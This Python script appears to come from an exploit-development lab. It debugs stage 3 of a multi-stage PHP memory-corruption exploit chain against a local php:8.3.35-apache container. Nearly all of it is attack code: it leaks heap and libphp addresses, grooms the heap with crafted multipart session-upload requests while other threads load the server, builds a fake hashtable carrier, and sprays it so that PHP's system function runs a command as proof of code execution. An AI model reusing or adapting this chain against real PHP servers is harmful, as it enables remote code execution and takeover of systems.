#!/usr/bin/env python3
"""Diagnose stage-3 failure under load: one chain run, full request/response
logging for stage 3 (status, Connection header, raw length, proof check)."""
from __future__ import annotations

import json
import os
import sys
import threading
import time

LAB = os.path.dirname(os.path.abspath(__file__))
DEV = os.path.join(LAB, "devploit-php2shell")
VENDOR = os.path.join(DEV, "vendor", "php2shell-upstream")
sys.path.insert(0, os.path.join(DEV, "tools"))
sys.path.insert(0, LAB)

import php2shell_calibrate as C  # noqa: E402
import php2shell_matrix as M  # noqa: E402
from ka_target import KATarget  # noqa: E402
from mw_test import hammer, pool_pin  # noqa: E402

PROFILE = os.path.join(LAB, "profiles-ours", "8.3.35-bookworm-amd64.json")
HTDATA_OFF = 0x6A0D8
PORT, NAME, CONF = 8302, "p2s-mwdiag", os.path.join(LAB, "apache-25w.conf")


def start():
    M.docker("rm", "-f", NAME)
    outdir = M.prepare_lab_out(os.path.join(M.LAB, "out", NAME))
    M.docker("run", "-d", "--name", NAME,
             "-p", f"127.0.0.1:{PORT}:80",
             "-v", f"{M.LAB}/webroot:/var/www/html:ro",
             "-v", f"{LAB}/php8335.ini:/usr/local/etc/php/conf.d/zz-mw.ini:ro",
             "-v", f"{CONF}:/etc/apache2/conf-enabled/zz-mw.conf:ro",
             "-v", f"{outdir}:/out",
             "php:8.3.35-apache", timeout=900)
    url = f"http://127.0.0.1:{PORT}/index.php"
    if not M.wait_http(url):
        raise SystemExit("no answer")
    return url, outdir


def show(tag, raw):
    head, _, _ = (raw or b"").partition(b"\r\n\r\n")
    conn = "?"
    for line in head.split(b"\r\n")[1:]:
        if line.lower().startswith(b"connection:"):
            conn = line.split(b":", 1)[1].strip().decode()
    m = None
    import re
    mm = re.match(rb"HTTP/1\.[01] (\d{3})", head)
    print(f"    [{tag}] status={mm.group(1).decode() if mm else '?'} "
          f"len={len(raw or b'')} connection={conn}")


def main():
    url, outdir = start()
    proof = os.path.join(outdir, "p1")
    mod = C.load_upstream(VENDOR)
    sym = C.extract_symbols(VENDOR, NAME)
    with open(PROFILE, encoding="utf-8") as fh:
        st = json.load(fh)["stages"]
    hints = {"stage1_n": st["stage1_n"], "stage1_len": st["stage1_forge_len"],
             "stage2_t": st["stage2_t"], "stage2_v": st["stage2_v"]}

    stop = threading.Event()
    release = threading.Event()
    stats = {"req": 0, "err": 0}
    threading.Thread(target=pool_pin, args=(url, 24, stop, release, stats),
                     daemon=True).start()
    time.sleep(2.0)
    for _ in range(4):
        threading.Thread(target=hammer, args=(url, stop, stats), daemon=True).start()
    time.sleep(1.0)

    t = KATarget(mod.Target(url, verbose=False))
    ex = mod.Exploit(t, "id>/out/p1", zif_offset=sym["zif_system"],
                     dtor_offset=sym["zval_ptr_dtor"], profile="bookworm",
                     verbose=False)
    chunk, _, _ = C.calibrate_stage1(mod, ex, hints)
    print(f"[*] chunk={hex(chunk)}")
    lib, _ = C.calibrate_stage2(mod, ex, sym["zval_ptr_dtor"], hints)
    print(f"[*] libphp={hex(lib)}")
    if not chunk or not lib:
        print("[!] leaks failed"); stop.set(); return 1

    release.set()
    time.sleep(1.5)
    os.environ["P2S_CARRIER_LEN"] = "15"
    ex.stage3_carrier = True
    ex.stage3_pads = [(31, 31)] * 6

    # stage-3 request 1 (groom + OOM) with logging
    parts = [
        {"name": "PHPSESSID", "data": b"a" * 19},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"p" * 3},
    ]
    for nl, vl in [(31, 31)] * 6:
        parts.append({"name": "p" * 30, "data": b"V" * vl})
    parts += [ex._file_part(), ex._big_field()]
    raw = t.post(mod.build_multipart(parts, b"S" * 17), b"S" * 17,
                 read_cap=1 << 20, timeout=90.0,
                 extra_headers={"Cookie": "PHPSESSID=" + "a" * 32})
    show("s3-req1-groom", raw)
    time.sleep(0.3)

    # stage-3 request 2 (carrier + spray) with logging
    import struct
    ht, ref = ex._fake_payload(chunk + HTDATA_OFF, lib + sym["zif_system"])
    parts = [
        {"name": "PHPSESSID", "data": mod.SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    carrier = struct.pack("<II", 1, 0x1A) + struct.pack("<Q", chunk + HTDATA_OFF)[:7]
    for i in range(2):
        parts.append({"name": f"f{i:02d}", "data": b"F" * 15})
    parts.append({"name": "g00", "data": carrier})
    for i in range(15):
        parts.append({"name": f"a{i:030d}"[:31], "data": ht})
    raw2 = t.post(mod.build_multipart(parts, b"B" * 10), b"B" * 10,
                  read_cap=65536, timeout=30.0)
    show("s3-req2-carrier", raw2)
    time.sleep(1.0)
    ok = os.path.exists(proof) and os.path.getsize(proof) > 0
    print(f"[*] proof={ok}")
    stop.set()
    M.docker("rm", "-f", NAME)
    return 0


if __name__ == "__main__":
    sys.exit(main())
